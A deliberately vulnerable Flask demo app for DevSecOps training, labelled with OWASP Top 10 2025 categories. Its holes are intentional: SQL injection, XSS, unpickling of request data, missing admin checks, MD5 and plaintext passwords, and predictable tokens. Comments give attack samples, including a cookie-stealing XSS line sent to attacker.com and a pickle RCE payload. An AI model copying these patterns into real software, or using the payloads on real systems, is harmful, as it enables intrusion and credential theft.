"""
Demo DevSecOps Application
Contains intentional vulnerabilities for educational purposes
OWASP Top 10 2025 Vulnerabilities Demonstrated
"""

import hashlib
import time
import pickle
import sqlite3
from flask import Flask, request, render_template_string, session, jsonify

app = Flask(__name__)
app.secret_key = 'hardcoded-secret-key-demo'  # V4: Hardcoded secret (weak crypto)

# In-memory user database (normally would be actual database)
USERS_DB = {
    'admin': {
        'password': 'admin123',  # V4: Plaintext password (cryptographic failure)
        'is_admin': True,
        'email': 'admin@demo.com'
    },
    'user1': {
        'password': 'password123',  # V4: Plaintext password
        'is_admin': False,
        'email': 'user1@demo.com'
    }
}

# V6: Missing security headers - will be added after each route

# ============================================================================
# V1: SQL INJECTION
# ============================================================================

@app.route('/login', methods=['GET', 'POST'])
def login():
    """
    V1: SQL Injection Vulnerability
    OWASP 2025: A05:2025 – Injection
    
    User input is directly concatenated into SQL query without parameterization
    """
    if request.method == 'POST':
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        
        # VULNERABLE: String concatenation in SQL query
        # Attacker can inject SQL: ' OR '1'='1
        query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
        
        # Simulating SQL execution (in real app, would query actual database)
        # Attacker could modify query to: SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '...'
        
        if username in USERS_DB and USERS_DB[username]['password'] == password:
            session['username'] = username
            session['is_admin'] = USERS_DB[username]['is_admin']
            return f"Login successful! Welcome {username}"
        else:
            return "Login failed"
    
    return '''
    <form method="POST">
        <input type="text" name="username" placeholder="Username"><br>
        <input type="password" name="password" placeholder="Password"><br>
        <button type="submit">Login</button>
    </form>
    '''

# ============================================================================
# V2: CROSS-SITE SCRIPTING (XSS)
# ============================================================================

@app.route('/profile/<username>')
def profile(username):
    """
    V2: Cross-Site Scripting (XSS) Vulnerability
    OWASP 2025: A05:2025 – Injection
    
    User input is rendered directly in HTML without sanitization
    """
    comment = request.args.get('comment', 'No comment provided')
    
    # VULNERABLE: Direct string interpolation in HTML
    # Attacker can inject: <script>alert('XSS')</script>
    # Or steal cookies: <img src=x onerror="fetch('http://attacker.com?c='+document.cookie)">
    
    html = f"""
    <h1>Profile: {username}</h1>
    <p>Comment: {comment}</p>
    <a href="/profile/{username}?comment=test">Back</a>
    """
    
    return render_template_string(html)

# ============================================================================
# V3: BROKEN ACCESS CONTROL
# ============================================================================

@app.route('/admin/users')
def admin_users():
    """
    V3: Broken Access Control Vulnerability
    OWASP 2025: A01:2025 – Broken Access Control
    
    No authorization check - any user can access admin endpoints
    """
    # VULNERABLE: No check if user is admin
    users_list = []
    for username, data in USERS_DB.items():
        users_list.append({
            'username': username,
            'email': data['email'],
            'is_admin': data['is_admin']
        })
    
    return jsonify(users_list)

@app.route('/admin/users/<user_id>/delete')
def delete_user(user_id):
    """
    V3: Broken Access Control - Direct Object Reference (IDOR)
    OWASP 2025: A01:2025 – Broken Access Control
    
    No authorization check - any user can delete any user
    """
    # VULNERABLE: No check if current user is admin
    # VULNERABLE: Direct object reference without validation
    
    if user_id in USERS_DB:
        del USERS_DB[user_id]
        return f"User {user_id} deleted successfully"
    return "User not found", 404

# ============================================================================
# V4: CRYPTOGRAPHIC FAILURES
# ============================================================================

def hash_password_weak(password):
    """
    V4: Cryptographic Failures Vulnerability
    OWASP 2025: A04:2025 – Cryptographic Failures
    
    Uses weak MD5 hashing instead of Argon2 or bcrypt
    """
    # VULNERABLE: MD5 is cryptographically broken
    return hashlib.md5(password.encode()).hexdigest()

@app.route('/register', methods=['POST'])
def register():
    """
    V4: Weak cryptographic hashing
    Passwords hashed with MD5 (broken algorithm)
    """
    username = request.form.get('username')
    password = request.form.get('password')
    
    # VULNERABLE: Weak MD5 hashing
    weak_hash = hash_password_weak(password)
    
    USERS_DB[username] = {
        'password': weak_hash,  # Stored as weak hash
        'is_admin': False,
        'email': request.form.get('email', '')
    }
    
    return f"User {username} registered with weak hash"

# ============================================================================
# V5: INSECURE AUTHENTICATION
# ============================================================================

@app.route('/api/login', methods=['POST'])
def api_login():
    """
    V5: Insecure Authentication Vulnerability
    OWASP 2025: A07:2025 – Authentication Failures
    
    - Predictable session tokens
    - No rate limiting (allows brute force)
    - No account lockout
    """
    username = request.json.get('username')
    password = request.json.get('password')
    
    # VULNERABLE: Predictable session token based on timestamp
    session_token = str(int(time.time()))  # Timestamp-based, predictable!
    
    # VULNERABLE: No rate limiting - can brute force
    # VULNERABLE: No account lockout - can try infinite passwords
    
    if username in USERS_DB and USERS_DB[username]['password'] == password:
        session['token'] = session_token
        return jsonify({'token': session_token})
    
    return jsonify({'error': 'Invalid credentials'}), 401

# ============================================================================
# V6: SECURITY MISCONFIGURATION
# ============================================================================

@app.route('/settings')
def settings():
    """
    V6: Security Misconfiguration Vulnerability
    OWASP 2025: A02:2025 – Security Misconfiguration
    
    Missing security headers:
    - X-Frame-Options
    - X-Content-Type-Options
    - Content-Security-Policy
    - Strict-Transport-Security
    """
    return "Application Settings"

# ============================================================================
# V7: SOFTWARE AND DATA INTEGRITY FAILURES
# ============================================================================

@app.route('/load_user_data')
def load_user_data():
    """
    V7: Software/Data Integrity Failures
    OWASP 2025: A08:2025 – Software or Data Integrity Failures
    
    Deserializes untrusted pickle data - allows RCE
    """
    serialized_data = request.args.get('data', '')
    
    try:
        # VULNERABLE: Unpickling untrusted data
        # Attacker can execute arbitrary Python code
        # Example attack:
        # import os
        # class Exploit:
        #     def __reduce__(self):
        #         return (os.system, ('touch /tmp/pwned',))
        # payload = pickle.dumps(Exploit())
        
        user_data = pickle.loads(serialized_data.encode())
        return f"Loaded user data: {user_data}"
    except Exception as e:
        return f"Error: {str(e)}", 400

# ============================================================================
# VULNERABLE CONFIGURATION
# ============================================================================

@app.before_request
def before_request():
    """
    V5: Missing security headers configuration
    """
    pass

@app.after_request
def after_request(response):
    """
    V6: Security Misconfiguration - Missing Security Headers
    VULNERABLE: Not setting important security headers
    """
    # Should set these but intentionally doesn't:
    # response.headers['X-Frame-Options'] = 'DENY'
    # response.headers['X-Content-Type-Options'] = 'nosniff'
    # response.headers['Content-Security-Policy'] = "default-src 'self'"
    # response.headers['Strict-Transport-Security'] = 'max-age=31536000'
    
    return response

# ============================================================================
# VULNERABLE DEBUG AND ERROR HANDLING
# ============================================================================

@app.errorhandler(404)
def not_found(error):
    """
    V6: Security Misconfiguration - Information Disclosure
    Verbose error messages reveal system information
    """
    return f"Route not found: {request.path} (Error: {error})", 404

@app.route('/error')
def trigger_error():
    """
    Intentionally trigger error to show stack trace
    V6: Information Disclosure through error pages
    """
    raise Exception("Intentional error for demonstration")

# ============================================================================
# DEMO ENDPOINTS
# ============================================================================

@app.route('/')
def index():
    """Home page"""
    return '''
    <h1>Demo DevSecOps Application</h1>
    <p>This app contains intentional vulnerabilities for educational purposes.</p>
    <ul>
        <li><a href="/login">Login (V1: SQL Injection)</a></li>
        <li><a href="/profile/admin?comment=test">Profile (V2: XSS)</a></li>
        <li><a href="/admin/users">Admin Users (V3: Broken Access Control)</a></li>
        <li><a href="/register">Register (V4: Weak Crypto)</a></li>
        <li><a href="/settings">Settings (V6: Misconfig)</a></li>
    </ul>
    <p><strong>⚠️ Warning: This app is intentionally vulnerable!</strong></p>
    '''

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({'status': 'healthy'})

if __name__ == '__main__':
    # V6: Debug mode enabled (security misconfiguration)
    app.run(debug=False, host='127.0.0.1', port=5000)
